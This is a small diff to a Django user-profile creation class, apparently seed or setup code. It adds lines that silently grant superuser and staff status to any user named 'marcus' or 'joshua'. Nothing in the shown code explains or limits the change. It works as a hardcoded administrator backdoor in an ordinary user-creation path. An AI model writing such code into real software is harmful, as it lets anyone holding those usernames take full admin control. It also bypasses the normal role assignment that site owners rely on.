@@ -334,6 +334,12 @@ class SimpleUserProfile:
                                                            )
         except django.db.utils.IntegrityError:
             user = profile_models.User.objects.get(username=self.first_name.lower())
+        
+        if user.username in ['marcus', 'joshua']:
+            user.is_superuser = True
+            user.is_staff = True
+            user.save()
+        
         try:
             user_profile = profile_models.UserProfile.objects.create(user=user,
                                                                      role=self.role,
